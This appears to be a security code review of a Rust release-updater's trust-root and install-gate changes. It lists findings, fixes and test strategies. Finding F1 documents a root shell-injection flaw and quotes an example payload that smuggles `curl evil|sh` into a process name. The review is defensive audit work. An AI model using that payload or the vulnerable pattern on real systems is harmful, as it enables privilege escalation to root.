━━━ FINDINGS — 7 total (Critical:1 Minor:6) ━━━

  [F1] CRITICAL conf(0.90, observed) — bins/cli/src/upgrade_restart.rs:293-295 — `sh -c "nohup {cmdline}"` interpolates `pgrep` output into a root shell during `sudo doli upgrade`; a local unprivileged process whose name matches `doli-node` wins root RCE. PRE-EXISTING at HEAD (`cmd_upgrade.rs:463-464`), moved byte-identical by M1 — NOT an M1 regression and NOT an M1 blocker
  [F2] MINOR conf(0.85, observed) — bins/cli/src/cmd_upgrade.rs:22-26 + bins/node/src/commands/misc.rs:141-149 — the operator's REQUESTED version is never compared to the served `tag_name`; a hostile origin can still substitute a different genuine signed release (bounded above by `is_newer_version`)
  [F3] MINOR conf(0.85, observed) — crates/updater/src/install_gate.rs:66-134 vs bins/node/src/updater/service.rs:344-388 + crates/updater/src/apply.rs:439-475 — the L1-L4 binding chain is now implemented TWICE in different shapes; the install_gate docstring's "cannot drift apart" claim covers only the two operator paths
  [F4] MINOR conf(0.80, observed) — crates/storage/src/maintainer.rs:239-256 — the atomic-rename `save` publishes the temp file's umask-derived mode over the target, dropping any tighter mode the old in-place `fs::write` preserved; no explicit mode is set on the file that decides which binaries install
  [F5] MINOR conf(0.90, observed) — specs/protocol.md:689 — §3.16 still says nodes "fall back to `BOOTSTRAP_MAINTAINER_KEYS`", the exact framing the rewritten §10.2 and `.claude/skills/updater/SKILL.md:493` now explicitly deny
  [F6] MINOR conf(0.90, observed) — bins/node/src/commands/update.rs:408-415 — `update verify` prints a `✓` for EVERY signature entry regardless of validity or root membership, beside a correct distinct-signer count
  [F7] MINOR conf(0.80, observed) — crates/updater/src/apply.rs:165 — routing manual apply through `auto_apply_from_github` silently drops `binary_url_template` / `custom_url` support from `doli-node update apply`; correct and fail-closed, but undocumented

  Speculative: 1 (report-only, not actionable)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Code Review: INC-I-172 M1 — maintainer trust root (Layer 1, node-local) — PASS 2

Run 508 · branch `bugfix/inc-i-172-maintainer-trust-root` · reviewer pass 2 (FINAL iteration)
Pass 1: `docs/reviews/inc-i-172-M1-trust-root-review.md` (13 findings)
Developer response: `docs/.workflow/inc-i-172-M1-dev-notes.md`

This is a re-review scoped to the remediation. Every pass-1 finding was re-derived from
the code, not accepted from the dev notes.

---

## 1. Gate results (run by the reviewer, this working tree)

```
cmd:$ cargo build --release
   → exit 0

cmd:$ cargo clippy --workspace --all-targets -- -D warnings
   → exit 0   (no warnings; also the workspace-wide positive control that the
                `apply_update` signature change left no un-updated caller)

cmd:$ cargo fmt --check
   → exit 0 (no output)

cmd:$ cargo test -p storage -p updater -p doli-cli -p doli-core
   → exit 0; 46 suites, every line "test result: ok"; 0 failed
     (largest: 972 passed, 251 passed, 195 passed)

cmd:$ cargo test -p doli-node -- --skip test_cluster_10x100
   → exit 0; 40 suites, every line "test result: ok"; 0 failed
     (final suite: "12 passed; 0 failed; 11 ignored; 2 filtered out; in 220.45s")
```

The whole gate is green, as it was in pass 1. Findings below are what the green gate
does not see.

## 2. [F1 pass-1, CRITICAL] — RESOLVED. The install gate now binds the artifact.

This was the finding that mattered, and it is genuinely fixed. The remediation added
`crates/updater/src/install_gate.rs::verify_release_artifact`, which enforces the whole
chain in ONE function that both operator paths call.

**Link-by-link verification against the code:**

| Link | Implementation | Verified |
|---|---|---|
| L1 `sf.version` == release tag | `install_gate.rs:73-84`, `normalize_version` strips only a leading `v` | Yes |
| L2 `sf.checksums_sha256` == sha256(bytes fetched) | `:87-103` — recomputes `sha256_hex(&release_info.checksums_body)`; does NOT read `release_info.checksums_sha256` | Yes |
| L3 threshold distinct signers over `"{sf.version}:{sf.checksums_sha256}"` | `:109-118` → `verify_release_with_trust_root` | Yes |
| L4 sha256(tarball) == per-platform hash from THAT body | `:121-123` — re-parses via `platform_tarball_hash(&checksums_text)` from `checksums_body`, NOT from `release_info.expected_hash` | Yes |

**The single-buffer anchor holds.** `GithubReleaseInfo.checksums_body` is populated once,
from one `download_from_url(checksums_url)` (`download.rs:453`), and both
`checksums_sha256` (`:454-458`) and `expected_hash` (`:462`) are derived from that same
buffer. The struct carries an explicit invariant comment at `download.rs:330-335`. L2 and
L4 both re-derive from `checksums_body` rather than trusting the derived fields, so a
future refactor that filled the two fields from different fetches cannot re-open the hole
silently.

**I tried to construct the three breaks the brief named, and could not:**

1. *Replayed genuine SIGNATURES.json from a different release* — L1 refuses. To pass L1 the
   attacker must serve `tag_name` = the replayed release; then L2 forces the genuine
   CHECKSUMS.txt of that release, and L4 forces its genuine tarball. The attack collapses
   from "install an arbitrary binary" to "install a complete, genuine, maintainer-signed
   release". That is the residual in **[F2]** below, not a break of the gate.
2. *CHECKSUMS.txt swapped after hashing* — impossible within the gate: L2 hashes and L4
   parses the same in-memory `Vec<u8>`. There is no re-fetch between them.
3. *Tarball hash from an unverified source* — closed by L4's re-parse. The operand
   `release_info.expected_hash` is never consulted by the gate.

Two further probes, both fail-closed:
- Duplicate per-platform lines in CHECKSUMS.txt: `platform_tarball_hash` takes the FIRST
  match while `fetch_github_release` selects the tarball ASSET by name. If those disagree,
  `verify_hash` mismatches and the install refuses. The attacker cannot craft the file
  anyway — L2 binds it to the signatures.
- `normalize_version` uses `trim_start_matches('v')`, which strips repeated `v`s. Not
  exploitable: L3 reconstructs the signed message from `signatures.version` VERBATIM, so
  a maintainer would have had to sign the literal string `vv6.24.1`.

**Both operator call sites pass the tarball they actually install.** `cmd_upgrade.rs:69`
downloads into `tarball`, `:111` passes that same binding to the gate, and `:133`/`:150`
extract from that same binding — no re-download, no TOCTOU. `misc.rs:175` → `:218` →
`:238` has the identical shape.

**The new behavioural test is not tautological.** `crates/updater/tests/inc_i_172_install_gate_binding.rs`
evaluates the real function on real Ed25519 signatures, and each attack test first runs
`assert_signatures_are_genuinely_valid` (`:186-206`) — a NEGATIVE CONTROL that verifies
the replayed signatures against the SAME root using the OLD self-reported-pair shape and
requires `Ok`. A refusal afterwards therefore proves the binding refused, not that the
fixture was broken. Traced each test against the pre-fix logic (verify sigs from `sf`'s own
pair, then `verify_hash(tarball, release_info.expected_hash)`):

| Test | Pre-fix outcome | Asserted | RED before fix? |
|---|---|---|---|
| `a_replayed_genuine_signatures_json_does_not_authorise_another_tarball` (`:298`) | `Ok` — sigs genuine, attacker's tarball matches attacker's CHECKSUMS.txt | `Err(ArtifactBindingMismatch{version})` | **Yes** |
| `version_alone_is_not_the_binding...` (`:342`) | `Ok` | `Err(...{checksums_sha256})` | **Yes** |
| `the_checksums_digest_is_recomputed_from_bytes_not_trusted_from_the_field` (`:376`) | `Err(HashMismatch)` — wrong variant | `Err(...{checksums_sha256})` | **Yes** |
| `a_substituted_tarball_is_refused...` (`:447`) | `Err(HashMismatch)` | same | No (GREEN-lock) |

Two GREEN-locks (`:242`, `:261`) prevent the fix from being a denial of upgrades: an
honest release installs, and a `v`-prefix plus uppercase-hex digest are tolerated.

**Verdict on F1: RESOLVED.** The pass-1 attack — arbitrary binary under a replayed
signature — is closed on both operator paths.

## 3. [F2 pass-1] — RESOLVED. `update apply` verifies, and the operand bug is fixed too.

`apply_update` now takes `root: &TrustRoot` as a **required** parameter
(`apply.rs:83-89`), which is the right shape: a caller cannot forget an argument the
compiler demands. SECURITY CHECK 3 at `:136-146` calls `verify_release_with_trust_root`
before any download. The single production caller (`bins/node/src/commands/update.rs:149-157`)
resolves the root via `command_trust_root(data_dir, network)` and passes it; `--force`
reaches only `approved_or_forced` (`:141`), never the signature check.

The secondary latent bug pass 1 flagged is also fixed: `apply.rs:165` now routes through
`auto_apply_from_github(&release.version, &release.binary_sha256)`, which re-checks
`release_info.checksums_sha256 == signed_checksums_sha256` (`:451-464`) and then
`verify_hash(&tarball, &release_info.expected_hash)` (`:474`). The old
`verify_hash(&binary, &release.binary_sha256)` — a binary compared against a text file's
hash — is gone. See **[F7]** for the one behavioural side effect.

## 4. [F3 pass-1] — RESOLVED. Both node commands resolve the on-chain root.

`command_trust_root` (`trust_root_wiring.rs:130-141`) does `load_maintainer_state` →
`resolve_trust_root` → prints provenance, key count, threshold and network. Both node
sites use it: `misc.rs:211` (`doli-node upgrade`) and `update.rs:405` (`update verify`),
plus `update.rs:149` (`update apply`). `resolve_trust_root` (`:58-109`) implements the
three-way table — non-empty ⇒ OnChain; empty + height 0 ⇒ Bootstrap; empty + height > 0 ⇒
unusable OnChain — so Bootstrap is reached only when the host is genuinely unbootstrapped.

The `doli` CLI keeps `TrustRoot::bootstrap` and now documents WHY at the call site
(`cmd_upgrade.rs:98-103`): it is not the node host, has no data directory and no chain
state. That is a correct and disclosed limitation, and `cmd_upgrade.rs:101-103` points
operators at `doli-node upgrade` on a producer.

## 5. [F4 pass-1] — RESOLVED. `save` is atomic; a torn write cannot brick startup.

`maintainer.rs:222-258`: encode into a `Vec`, `File::create(tmp)` where `tmp` is
`data_dir.join("maintainer_state.bin.tmp")` — the SAME directory, so `rename` stays within
one filesystem (`:22-23`, `:238-239`) — `write_all`, `sync_all()` (`:245`, durability
before visibility), then `std::fs::rename` (`:253`). Both failure branches
`remove_file(&tmp)` and return `Err`, leaving the existing target untouched.

The brick scenario is closed: `rename(2)` is atomic, so after a crash the target is the
old complete file or the new complete file — both decode, and neither reaches the fatal
`load` branch. The rename target is correct (`Self::file_path(data_dir)`, `:225`). See
**[F4 pass-2]** for the permission-mode side effect, which is a hardening point, not a
brick.

## 6. [F5] [F6] [F9] [F10] [F11] [F13] pass-1 — all RESOLVED.

- **F5** `specs/protocol.md` §10.2 rewritten (73 insertions / 21 deletions): the fail-open
  `else` branch is gone, replaced by the trust-root resolution table; the counter is now
  the distinct-signer double loop with `break`; the threshold is `root.threshold()` with an
  explicit `// NOT a hardcoded 3`. A new "Artifact binding" subsection documents L1-L4.
  One stale line survives elsewhere in the file — **[F5 pass-2]**.
- **F6** `.claude/skills/updater/SKILL.md:493` now reads "Bootstrap keys are **NOT a
  fallback.**" with the resolution condition spelled out; `:159` states the return type as
  `Result<usize>` and names the distinct-signer semantics and the F10 case-insensitivity.
  The `Ok(())` at `:61` refers to `check_production_allowed`, a different function — not
  drift.
- **F9** closed by `inc_i_172_install_gate_binding.rs` and `inc_i_172_apply_update_gate.rs`,
  which evaluate real functions on real bytes rather than asserting source text.
- **F10** `verification.rs:106` is now `!sig.public_key.eq_ignore_ascii_case(expected_key)`.
- **F11** `maintainer.rs:32-33` now reads "1,414,745,412 (`0x54534D44`, the little-endian
  reading of `DMST`) — about 1.41 billion".
- **F13** `trust_root_wiring.rs:87-95` raised to `warn!` with the fixed grep anchor
  `TRUST_ROOT_BOOTSTRAP:` and text naming the wiped-data-dir case explicitly.

## 7. Regression hunt — what the remediation touched, and what it moved

The fix touched five install paths, the storage encoder, and split
`bins/cli/src/cmd_upgrade.rs` into `cmd_upgrade.rs` + `upgrade_restart.rs`. That split is
where the highest-value finding of this pass came from.

Checked and clean: `apply_update`'s new required parameter has no un-updated caller
(workspace `--all-targets` clippy at `-D warnings` is the positive control); the auto-update
path (`service.rs:344-388`) is unchanged in shape and still re-resolves the root per call
(`trust_root_wiring.rs:147-165`); `pending_update.json` compatibility is unaffected;
`MaintainerState::load`'s four-branch table (`maintainer.rs:105-126`) is unchanged, and a
stale `.tmp` left by a crash is never read.

## 8. Findings

### [F1] CRITICAL — root shell injection in the upgrade restart path (PRE-EXISTING, not an M1 regression)

- **Location:** `bins/cli/src/upgrade_restart.rs:293-295`
- **Evidence:**
  ```rust
  // upgrade_restart.rs:293-295
  let spawn_result = std::process::Command::new("sh")
      .args(["-c", &format!("nohup {} > /dev/null 2>&1 &", cmdline)])
      .status();
  ```
  `cmdline` is untrusted process metadata: it is the second whitespace-delimited field of a
  `pgrep` line (`:246-271`), where the args are `["-fl", "doli-node"]` on macOS and
  `["-a", "doli-node"]` on Linux (`:240-244`). `-fl` matches the FULL command line, so any
  local process whose argv contains the substring `doli-node` is selected and its argv is
  interpolated into a shell string. This function is reached from
  `restart_doli_service` after a successful install, i.e. under `sudo doli upgrade` — the
  documented remediation path (MEMORY: "non-root `doli upgrade` … use `sudo`").
  A local unprivileged user running e.g.
  `exec -a 'doli-node; curl evil|sh' sleep 999` therefore obtains root code execution the
  next time an operator upgrades.
  Provenance, established by direct comparison rather than assumed:
  ```
  cmd:$ git show HEAD:bins/cli/src/cmd_upgrade.rs | grep -n 'nohup\|Command::new("sh")'
  463:        let spawn_result = std::process::Command::new("sh")
  464:            .args(["-c", &format!("nohup {} > /dev/null 2>&1 &", cmdline)])
  cmd:$ diff <(git show HEAD:bins/cli/src/cmd_upgrade.rs | sed -n '405,475p') \
             <(sed -n '236,306p' bins/cli/src/upgrade_restart.rs)
  1d0
  < }
  71a71
  > }
  ```
  The only delta is a one-line block offset: the body is byte-identical. M1 MOVED this code
  during the module split; it did not write or alter it.
- **Impact:** local privilege escalation to root on every producer host, in the same class
  as the ISSUE-174 #7 `/tmp` TOCTOU vector `.claude/skills/updater/SKILL.md:117` records as
  already hardened. It is unaffected by M1's trust-root work — no release needs to be
  malicious; the operator only has to run the upgrade.
- **Why this does NOT block the M1 commit:** the defect exists on `main` at HEAD today and
  is byte-identical after the change, so M1 neither introduces nor worsens it. Blocking M1
  would hold the F1-pass-1 fix — a strictly larger security win on the same command — out
  of the tree while leaving this vector live regardless. It must be fixed, but as its own
  incident, not as a condition on this milestone.
- **Suggested fix:** stop building a shell string. Recover argv without a shell — read
  `/proc/<pid>/cmdline` on Linux (NUL-delimited, no quoting ambiguity) or use
  `ps -o args=` and then `Command::new(argv[0]).args(&argv[1..])` with
  `Stdio::null()` and `setsid`, so no metacharacter is ever interpreted. Additionally
  restrict selection to processes whose executable path resolves to the binary just
  installed, rather than to any cmdline containing the substring `doli-node`.
- **Test strategy:** spawn a helper process whose argv[0] is
  `doli-node; touch $CANARY` (via `exec -a`), invoke the restart path against it, and
  assert `$CANARY` does not exist. That test fails today and passes after the fix.
- **Confidence:** `conf(0.90, observed)`
- **Severity:** Critical (non-blocking for M1 — see above)

━━━ RESOURCE COST — NEGLIGIBLE ━━━
Dimensions:
  CPU:      0 (observed — replaces one `sh -c` fork with one direct `exec`; strictly fewer processes, on a human-triggered path that runs at most once per release)
  Memory:   0 (observed — argv is read into a short-lived `Vec<String>` of a few hundred bytes instead of one `String`)
  IO:       +1 read of /proc/<pid>/cmdline per matched process (observed — replaces the shell's own implicit work; the path already runs `pgrep` and `kill`)
  Network:  0 (observed — no network interaction in the restart path)
  Disk:     0 (observed — nothing is written)
  Latency:  0 (observed — node startup/restart only; no block production, validation, gossip, sync or RPC path is touched)
Inevitability: AVOIDABLE
Cheaper alternative: leave the `sh -c` respawn as-is, since it predates this milestone and the gate is green
Why this proposal anyway: the cheaper path leaves a local-user-to-root escalation live on every producer host, reachable by the operator simply running the documented `sudo doli upgrade`; the measurable advantage of the fix is that no attacker-supplied byte is ever interpreted by a shell, which is the same closure ISSUE-174 #7 already applied to the sibling staging path in this identical command

### [F2] MINOR — the requested version is never pinned to the served tag

- **Location:** `bins/cli/src/cmd_upgrade.rs:22-26`; `bins/node/src/commands/misc.rs:141-149`
- **Evidence:** both call `updater::fetch_github_release(version.as_deref())` and then use
  the RETURNED `release.version` for every subsequent decision. Inside
  `fetch_github_release`, that value is `release["tag_name"]` stripped of `v`
  (`download.rs:433-436`) — attacker-supplied if the origin is compromised. Neither site
  compares it back to the operator's `version` argument. The install gate's L1 then compares
  `sf.version` to that same attacker-supplied tag (`install_gate.rs:73`), so L1 cannot
  detect the substitution.
  The only remaining bound is `is_newer_version(&release.version, current)`
  (`cmd_upgrade.rs:26`, `misc.rs:146`), which blocks a downgrade below the RUNNING version
  but permits any genuine release between it and the requested one.
- **Impact:** a hostile origin cannot install an arbitrary binary any more (that is F1
  pass-1, fixed) but can still choose WHICH genuine signed release an operator receives —
  e.g. pinning the fleet to the last release before a security fix. Bounded: the artifact is
  always maintainer-signed and always newer than what is running.
- **Suggested fix:** when `version` is `Some(v)`, refuse unless
  `normalize_version(&release.version) == normalize_version(v)`. Reuse
  `install_gate::normalize_version` (make it `pub(crate)` and re-export) so the two
  comparisons cannot drift.
- **Test strategy:** construct a `GithubReleaseInfo` whose `version` differs from the
  requested string and assert the helper returns `Err`; the honest case must still return
  `Ok`.
- **Confidence:** `conf(0.85, observed)`
- **Severity:** Minor

━━━ RESOURCE COST — NEGLIGIBLE ━━━
Dimensions:
  CPU:      0 (observed — one additional string comparison per operator-initiated upgrade, on data already in memory)
  Memory:   0 (observed — no allocation; `normalize_version` returns a borrowed `&str`)
  IO:       0 (observed — no file or syscall added)
  Network:  0 (observed — compares fields already downloaded; no additional request)
  Disk:     0 (observed — nothing written)
  Latency:  0 (observed — human-triggered command path only; no consensus, gossip, sync or RPC path touched)
Inevitability: AVOIDABLE
Cheaper alternative: rely on the operator noticing that the printed "New version available: v… -> v…" line does not name the version they asked for
Why this proposal anyway: that alternative depends on an operator reading a line during a routine upgrade, which is not a control; the measurable advantage is that `--version` becomes a binding request rather than a hint, closing the last origin-controlled degree of freedom the F1 fix left open

### [F3] MINOR — the L1-L4 chain is now implemented twice

- **Location:** `crates/updater/src/install_gate.rs:66-134` vs
  `bins/node/src/updater/service.rs:344-388` + `crates/updater/src/apply.rs:439-475`
- **Evidence:** `install_gate.rs:12-14` states its purpose as keeping the paths from
  drifting — "in one function, so the two operator paths … cannot drift apart". It is
  accurate but scoped: only `cmd_upgrade.rs:111` and `misc.rs:218` call it. The automatic
  path and `apply_update` obtain the same property by a different construction — verify the
  staged release's signatures (`service.rs:369`, `apply.rs:136`), then re-derive the binding
  inside `auto_apply_from_github`, where L1 is implicit in
  `fetch_github_release(Some(version))` (`apply.rs:443`), L2 is the explicit
  `eq_ignore_ascii_case` at `:451-464`, and L4 is `verify_hash(&tarball, &release_info.expected_hash)`
  at `:474`. Both chains are currently complete; they are two shapes of one invariant.
- **Impact:** no defect today. It is a drift surface: a future change to one chain will not
  be caught by the tests pinning the other, which is precisely the failure mode that
  produced F1 pass-1 (a control that existed on one path and was vacuous on another).
- **Suggested fix:** have `auto_apply_from_github` call `verify_release_artifact` once it
  holds `release_info`, `tarball` and the `SignaturesFile`, and delete the two inline
  comparisons. If the refactor is judged too invasive for M1, add a comment in each chain
  naming the other as the sibling implementation, and record the pair in the M2 contract.
- **Test strategy:** parameterise `inc_i_172_install_gate_binding.rs`'s replay fixtures over
  both entry points and assert the identical `Err` variant from each.
- **Confidence:** `conf(0.85, observed)`
- **Severity:** Minor

━━━ RESOURCE COST — NEGLIGIBLE ━━━
Dimensions:
  CPU:      0 (observed — unifying removes one redundant sha256 comparison; the tarball hash is computed once either way)
  Memory:   0 (observed — no new retained allocation; the same `checksums_body` buffer is reused)
  IO:       0 (observed — no file access added or removed)
  Network:  0 (observed — the same single CHECKSUMS.txt and single tarball fetch)
  Disk:     0 (observed — nothing written)
  Latency:  0 (observed — update-check and install paths only, which run on a multi-hour cadence; no block, gossip, sync or RPC path)
Inevitability: AVOIDABLE
Cheaper alternative: leave both chains in place and rely on review to keep them equivalent
Why this proposal anyway: review is exactly what failed here in pass 1 — the vacuous operator gate passed a green build, green clippy, a PASS QA report and four wiring tests; the measurable advantage of one implementation is that the existing replay tests become load-bearing for every install path instead of two of five

### [F4] MINOR — atomic `save` publishes umask-derived permissions over the target

- **Location:** `crates/storage/src/maintainer.rs:239-256`
- **Evidence:** `std::fs::File::create(&tmp)` (`:241`) creates with `0o666 & !umask`, and
  `std::fs::rename(&tmp, &path)` (`:253`) replaces the target INODE, so the target inherits
  the temp file's mode. The previous `std::fs::write` opened the existing file in place
  (create + truncate + write), which PRESERVES the mode of an existing file. Any tighter
  mode an operator or packaging step had applied to `maintainer_state.bin` is therefore
  silently reset on the first migration save. No explicit `set_permissions` or
  `OpenOptions::mode` call exists in the function. Under a service started with no `UMask=`
  directive the resulting mode is `0666`.
- **Impact:** the file that decides which keys may authorise a binary install has a mode
  determined by ambient umask rather than by policy. Not directly exploitable — a local
  writer would additionally need to control the release origin to profit, and the F1
  pass-1 gate now binds that origin — but it is a defence-in-depth regression against the
  pre-change behaviour, and this is the wrong file to leave umask-dependent. Secondary:
  there is no `fsync` of the containing DIRECTORY after the rename, so a crash can revert
  to the previous complete file. That is benign (it decodes) and does not affect the F4
  brick property.
- **Suggested fix:** set the mode explicitly on the temp file before the rename —
  `OpenOptions::new().write(true).create_new(true).mode(0o644)` under
  `#[cfg(unix)]`, or `fs::set_permissions(&tmp, Permissions::from_mode(0o644))` after
  `sync_all` and before `rename`. Optionally open the parent directory and `sync_all` it
  after the rename.
- **Test strategy:** on unix, `save` into a temp dir under a permissive umask and assert
  `metadata(path).permissions().mode() & 0o777 == 0o644`; separately `chmod 0600` an
  existing file, `save` again, and assert the mode is the policy value rather than
  whatever umask produced.
- **Confidence:** `conf(0.80, observed)`
- **Severity:** Minor

━━━ RESOURCE COST — NEGLIGIBLE ━━━
Dimensions:
  CPU:      0 (observed — one `fchmod`-equivalent per save; saves occur on migration and on maintainer-set changes only, not on any block path)
  Memory:   0 (observed — no allocation added)
  IO:       +1 syscall per maintainer_state save, +1 more if the optional directory fsync is adopted (observed — on a write that happens at most once per maintainer-set change)
  Network:  0 (observed — purely local file handling)
  Disk:     0 (observed — identical bytes written; only the inode mode differs)
  Latency:  0 (observed — node startup and governance-apply paths only; never in block production, validation, gossip, sync or RPC)
Inevitability: AVOIDABLE
Cheaper alternative: accept the umask-derived mode, since the file contains only on-chain public keys and a height
Why this proposal anyway: the content is public but the file is AUTHORITY — a writable `maintainer_state.bin` lets a local user install a trust root of their own choosing, and the previous code happened to preserve a hardened mode where the new code discards it; the measurable advantage is that the mode becomes a stated policy instead of a property of whatever umask the service inherited

### [F5] MINOR — `specs/protocol.md` §3.16 still uses the "fall back" framing §10.2 now denies

- **Location:** `specs/protocol.md:689`
- **Evidence:**
  ```
  cmd:$ sed -n '689p' specs/protocol.md
  - Pre-bootstrap: nodes fall back to `BOOTSTRAP_MAINTAINER_KEYS` (hardcoded in binary) for release signature verification
  ```
  against the same file's rewritten §10.2 at `:1831` — "There is **no fallback to the
  compiled bootstrap keys** (INC-I-172 F1)" — and `.claude/skills/updater/SKILL.md:493` —
  "Bootstrap keys are **NOT a fallback.**". The BEHAVIOUR the line describes is correct
  (a genuinely unbootstrapped node does resolve to `Bootstrap`); only the framing is the
  deleted one. The file WAS modified by this diff (73 insertions, 21 deletions), so this is
  a survivor, the same shape as pass-1 F6.
- **Impact:** low but real. §3.16 is the section a reader lands on when searching the spec
  for maintainer bootstrap, and "fall back" is the exact word the milestone spent its
  effort retiring. A reader who stops at :689 carries away the pre-M1 mental model.
- **Suggested fix:** rewrite to "Pre-bootstrap: a node that has never established an
  on-chain set (`members` empty AND `last_derived_height == 0`) resolves the `Bootstrap`
  trust root and verifies against `BOOTSTRAP_MAINTAINER_KEYS`. This is a resolution, not a
  fallback — see §10.2." and link the resolution table.
- **Test strategy:** NOT_TESTABLE (documentation).
- **Confidence:** `conf(0.90, observed)`
- **Severity:** Minor

━━━ RESOURCE COST — NONE ━━━
Dimensions:
  CPU:      0 (observed — documentation text; no code path changes)
  Memory:   0 (observed — documentation text)
  IO:       0 (observed — documentation text)
  Network:  0 (observed — documentation text)
  Disk:     0 (observed — a few edited bytes in a spec file already tracked in git)
  Latency:  0 (observed — no runtime path exists for a specification sentence)
Inevitability: AVOIDABLE
Cheaper alternative: leave the sentence, since §10.2 is authoritative and states the opposite
Why this proposal anyway: two sentences in one authoritative spec asserting opposite things is the drift class this milestone was partly written to eliminate, and pass 1 already found the identical survivor in SKILL.md; the measurable advantage is that a grep for "fallback" in the spec no longer returns the deleted behaviour as fact

### [F6] MINOR — `update verify` prints a check mark for every signature entry, valid or not

- **Location:** `bins/node/src/commands/update.rs:408-415`
- **Evidence:**
  ```rust
  Ok(distinct_signers) => {
      for sig in &release.signatures {
          if sig.public_key.len() >= 16 {
              println!("║  ✓ {}...  ║", &sig.public_key[..16]);
  ```
  The loop iterates `release.signatures` unconditionally — it consults neither
  `root.keys()` nor the per-entry verification result. `verify_release_with_trust_root`
  returns only a count (`verification.rs:53`), not the set of accepted keys, so the display
  cannot know which entries passed. A release carrying five entries of which three verify
  prints five `✓` marks, then the correct `"Verified: 3 distinct signature(s), threshold 3"`
  at `:420-425`.
- **Impact:** cosmetic but in a security-reporting surface that pass 1 made scriptable and
  load-bearing. The authoritative number is printed and the command now returns `Err` on
  failure (`:434-438`), so no wrong decision follows from it — an operator reading the check
  marks rather than the count simply over-counts maintainer support. Pre-existing display
  code, not introduced by the remediation.
- **Suggested fix:** print the check marks from the ROOT's perspective — iterate
  `root.keys()` and mark each key found or not — or have
  `verify_release_with_trust_root` return the accepted key list instead of a bare `usize`
  and render from that.
- **Test strategy:** verify a release with one in-root signer and one foreign signer;
  assert the rendered output contains exactly one `✓`.
- **Confidence:** `conf(0.90, observed)`
- **Severity:** Minor

━━━ RESOURCE COST — NONE ━━━
Dimensions:
  CPU:      0 (observed — same loop bound by `root.keys()` instead of `release.signatures`, both single-digit)
  Memory:   0 (observed — returning a `Vec<String>` of accepted keys allocates a handful of short strings on a human-invoked command)
  IO:       0 (observed — stdout only, unchanged volume)
  Network:  0 (observed — no request added)
  Disk:     0 (observed — nothing written)
  Latency:  0 (observed — operator-invoked CLI display path; no consensus, gossip, sync or RPC path)
Inevitability: AVOIDABLE
Cheaper alternative: leave the display, since the authoritative distinct-signer count is printed two lines below it
Why this proposal anyway: the count and the check marks disagree on exactly the input that matters — a release carrying signatures from revoked or foreign keys — and this command exists to tell an operator what the trust root accepted; the measurable advantage is that the most visually salient element of the output stops asserting something the verification never established

### [F7] MINOR — manual apply silently lost custom-origin support

- **Location:** `crates/updater/src/apply.rs:165`
- **Evidence:** `apply_update` now ends in
  `auto_apply_from_github(&release.version, &release.binary_sha256).await?`, which fetches
  from the GitHub API for that tag (`:443`). The code it replaced called
  `download_binary(release)`, which tries `release.binary_url_template` FIRST and falls back
  to GitHub (`download.rs:21-25`). A `Release` produced from a configured
  `custom_url` (`download.rs:109-123`, reached via `service_checks.rs:46`) carries a
  `binary_url_template` and a `binary_sha256` that need not be `sha256(CHECKSUMS.txt)` of a
  GitHub asset, so such a pending update can no longer be applied by
  `doli-node update apply`; it now fails at the `checksums_sha256` comparison
  (`apply.rs:451-464`) or earlier at the tag fetch.
  Positive control that this is a real orphaning: `download_binary` has no remaining
  non-test caller in either root — `grep -rn "download_binary" bins crates --include='*.rs'`
  returns only its definition (`download.rs:23`) and its `lib.rs:54` re-export.
- **Impact:** none on any deployed network — the fleet is GitHub-anchored and INC-I-157
  removed the fallback mirror for the same reason. The new behaviour is fail-closed and is
  the correct direction. But it is an undocumented capability removal, and the automatic
  path can still CHECK a custom-URL release it can never APPLY, which presents as a node
  that repeatedly notices an update and never installs it.
- **Suggested fix:** decide explicitly. Either drop `custom_url` from `UpdateConfig` and
  delete the now-orphaned `download_binary`, or reject a custom-URL release at CHECK time
  with a message naming the reason. Record the decision in `docs/auto_update_system.md`
  and in the M2 contract.
- **Test strategy:** build a `Release` with a `binary_url_template` and a `binary_sha256`
  that is not a GitHub CHECKSUMS.txt digest, call `apply_update` with a satisfying root,
  and assert the error names the origin restriction rather than surfacing as an opaque
  `HashMismatch`.
- **Confidence:** `conf(0.80, observed)`
- **Severity:** Minor

━━━ RESOURCE COST — NEGLIGIBLE ━━━
Dimensions:
  CPU:      0 (observed — a check-time predicate on a struct field, evaluated once per update check, i.e. once per several hours)
  Memory:   0 (observed — deleting `download_binary` removes code; adding the check allocates nothing)
  IO:       0 (observed — no file access added)
  Network:  −1 request in the rejected case (observed — refusing at check time avoids the tarball download that currently happens before the failure)
  Disk:     0 (observed — nothing written)
  Latency:  0 (observed — update-check cadence only; no block production, validation, gossip, sync or RPC path)
Inevitability: AVOIDABLE
Cheaper alternative: leave it, since no deployed network configures `custom_url`
Why this proposal anyway: an update path that can perpetually detect a release it can never install is an operational trap that presents as a stuck node rather than as a configuration error, and `download_binary` is now dead code that reads as a live second download route; the measurable advantage is that the origin restriction becomes an explicit refusal with a reason instead of an opaque hash mismatch after a wasted download

## 9. Speculative findings (low-confidence, not actionable)

### [S1] `doli-node upgrade` gains a new hard-refusal mode on an unreadable data dir

`MaintainerState::load` does `std::fs::read(&path)?` (`maintainer.rs:117`) after an
`exists()` check, so a PermissionDenied propagates as `StorageError::Io` and
`command_trust_root` turns it into the FATAL message at `trust_root_wiring.rs:44-53`. An
operator invoking `doli-node upgrade` as a user who can write the binary but cannot read
the node's data directory now gets a refusal where the command previously worked against
the compiled keys. This is fail-closed and arguably correct, and the realistic invocations
(root, or the `doli` service user) both read fine — but the message blames a "damaged"
file, which would misdirect diagnosis of a permission problem. I could not establish a
deployment where this actually occurs, and the missing-file case is handled correctly, so
this is an observation about error attribution rather than a defect.
`conf(0.45, inferred)`

## 10. Pass-1 finding disposition

| Pass-1 | Severity | Disposition | Where verified |
|---|---|---|---|
| **F1** the operator gates verify a signature not bound to the artifact | Critical | **RESOLVED** | `crates/updater/src/install_gate.rs:66-134`; call sites `cmd_upgrade.rs:111`, `misc.rs:218`; behavioural test `crates/updater/tests/inc_i_172_install_gate_binding.rs` (§2) |
| **F2** `update apply` installs with no signature verification | Major | **RESOLVED** | `apply.rs:83-89` (required `&TrustRoot`), `:136-146`; caller `update.rs:149-157`. Secondary `verify_hash` operand bug also fixed at `:165` (§3) |
| **F3** node commands consult the compiled keys, not the on-chain set | Major | **RESOLVED** | `trust_root_wiring.rs:130-141`; used at `misc.rs:211`, `update.rs:405`, `update.rs:149` (§4) |
